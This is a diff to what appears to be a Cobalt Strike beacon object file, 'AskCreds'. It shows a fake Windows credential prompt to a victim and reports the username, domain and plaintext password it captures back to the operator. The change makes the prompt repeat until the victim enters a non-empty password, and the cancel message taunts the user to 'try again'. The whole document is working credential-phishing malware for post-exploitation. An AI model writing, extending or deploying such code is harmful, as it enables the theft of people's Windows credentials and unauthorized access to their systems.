@@ -86,16 +86,21 @@ CleanUp:
 	return TRUE;
 }
 
-DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
-	DWORD dwRet = 0;
-	HWND hWnd;
-	CREDUI_INFOW credUiInfo;
-	credUiInfo.pszCaptionText = lpwReason;
-	credUiInfo.pszMessageText = (LPCWSTR)MESSAGE;
-	credUiInfo.cbSize = sizeof(credUiInfo);
-	credUiInfo.hbmBanner = NULL;
-	credUiInfo.hwndParent = NULL;
+BOOL is_empty_or_whitespace(WCHAR *str) {
+    if (str == NULL) {
+        return TRUE;
+    }
 
+    while (*str) {
+        if (!MSVCRT$iswspace(*str)) {
+            return FALSE;
+        }
+        str++;
+    }
+    return TRUE;
+}
+
+DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 	DWORD authPackage = 0;
 	WCHAR szUsername[MAXLEN];
 	LPWSTR lpwPasswd = L"";
@@ -119,55 +124,81 @@ DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 		}
 	}
 
-	hWnd = USER32$GetForegroundWindow();
-	if (hWnd != NULL) {
-		credUiInfo.hwndParent = hWnd;
-	}
+	DWORD dwRet;
+	HWND hWnd;
+	CREDUI_INFOW credUiInfo;
+	BOOL bValidPassword = FALSE;
+	LPWSTR password = NULL;
 
-	dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
-		&credUiInfo, 0, 
-		&authPackage, 
-		inCredBuffer, 
-		inCredSize, 
-		&outCredBuffer, 
-		&outCredSize, 
-		&bSave, 
-		CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
-		);
-	
-	if (dwRet == ERROR_SUCCESS) { 
-		WCHAR szUsername[MAXLEN + 1];
-		WCHAR szPasswd[MAXLEN + 1];
-		WCHAR szDomain[MAXLEN + 1];
-		DWORD maxLenName = MAXLEN + 1;
-		DWORD maxLenPassword = MAXLEN + 1;
-		DWORD maxLenDomain = MAXLEN + 1;
+	do {
+		dwRet = 0;
+		credUiInfo.pszCaptionText = lpwReason;
+		credUiInfo.pszMessageText = (LPCWSTR)MESSAGE;
+		credUiInfo.cbSize = sizeof(credUiInfo);
+		credUiInfo.hbmBanner = NULL;
+		credUiInfo.hwndParent = NULL;
 
-		if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, szUsername, &maxLenName, szDomain, &maxLenDomain, szPasswd, &maxLenPassword)) {
-			if (MSVCRT$_wcsicmp(szDomain, L"") == 0) {
-				BeaconPrintf(CALLBACK_OUTPUT, 
-					"[+] Username: %ls\n"
-					"[+] Password: %ls\n", szUsername, szPasswd);
-
-			}
-			else {
-				BeaconPrintf(CALLBACK_OUTPUT, 
-					"[+] Username: %ls\n"
-					"[+] Domainname: %ls\n"
-					"[+] Password: %ls\n", szUsername, szDomain, szPasswd);
-			}
+		hWnd = USER32$GetForegroundWindow();
+		if (hWnd != NULL) {
+			credUiInfo.hwndParent = hWnd;
 		}
 
-		MSVCRT$memset(szUsername, 0, sizeof(szUsername));
-		MSVCRT$memset(szPasswd, 0, sizeof(szPasswd));
-		MSVCRT$memset(szDomain, 0, sizeof(szDomain));
-	}
-	else if (dwRet == ERROR_CANCELLED) {
-		BeaconPrintf(CALLBACK_ERROR, "The operation was canceled by the user, try again ;)\n");
-	}
-	else {
-		BeaconPrintf(CALLBACK_ERROR, "CredUIPromptForWindowsCredentialsW failed, error: %d\n", dwRet);
-	}
+		dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
+			&credUiInfo, 0, 
+			&authPackage, 
+			inCredBuffer, 
+			inCredSize, 
+			&outCredBuffer, 
+			&outCredSize, 
+			&bSave, 
+			CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
+			);
+		
+		if (dwRet == ERROR_SUCCESS) { 
+			WCHAR szUsername[MAXLEN + 1];
+			WCHAR szPasswd[MAXLEN + 1];
+			password = MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));
+			WCHAR szDomain[MAXLEN + 1];
+			DWORD maxLenName = MAXLEN + 1;
+			DWORD maxLenPassword = MAXLEN + 1;
+			DWORD maxLenDomain = MAXLEN + 1;
+
+			if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, szUsername, &maxLenName, szDomain, &maxLenDomain, password, &maxLenPassword)) {
+				bValidPassword = !is_empty_or_whitespace(password);
+				if (!bValidPassword) {
+					BeaconPrintf(CALLBACK_OUTPUT, "[!] User tried to enter empty password\n");
+				}
+				else {
+					if (MSVCRT$_wcsicmp(szDomain, L"") == 0) {
+						BeaconPrintf(CALLBACK_OUTPUT, 
+							"[+] Username: %ls\n"
+							"[+] Password: %ls\n", szUsername, password);
+
+					}
+					else {
+						BeaconPrintf(CALLBACK_OUTPUT, 
+							"[+] Username: %ls\n"
+							"[+] Domainname: %ls\n"
+							"[+] Password: %ls\n", szUsername, szDomain, password);
+					}
+
+					MSVCRT$memset(szUsername, 0, sizeof(szUsername));
+					MSVCRT$memset(szPasswd, 0, sizeof(szPasswd));
+					MSVCRT$memset(szDomain, 0, sizeof(szDomain));
+
+					break;
+				}
+			}	
+		}
+		else if (dwRet == ERROR_CANCELLED) {
+			BeaconPrintf(CALLBACK_ERROR, "The operation was canceled by the user, try again ;)\n");
+		}
+		else {
+			BeaconPrintf(CALLBACK_ERROR, "CredUIPromptForWindowsCredentialsW failed, error: %d\n", dwRet);
+		}
+	} while (!bValidPassword);
+
+	MSVCRT$free(password);
 
 	if (inCredBuffer != NULL) {
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
@@ -175,7 +206,6 @@ DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 
 	return dwRet;
 }
-
 
 VOID go(IN PCHAR Args, IN ULONG Length) {
 	HANDLE hThread = NULL;
